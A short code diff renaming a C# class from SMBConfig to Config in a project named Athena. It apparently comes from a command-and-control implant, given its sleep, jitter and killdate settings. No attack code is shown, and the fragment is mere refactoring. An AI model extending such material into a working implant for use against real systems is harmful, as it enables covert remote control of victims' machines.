@@ -14,7 +14,7 @@ using System.Text.Json;
 
 namespace Athena
 {
-    public class SMBConfig : IConfig
+    public class Config : IConfig
     {
         public IProfile profile { get; set; }
         //public string uuid { get; set; }
@@ -22,7 +22,7 @@ namespace Athena
         public int sleep { get; set; }
         public int jitter { get; set; }
 
-        public SMBConfig()
+        public Config()
         {
             //uuid = "%UUID%";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
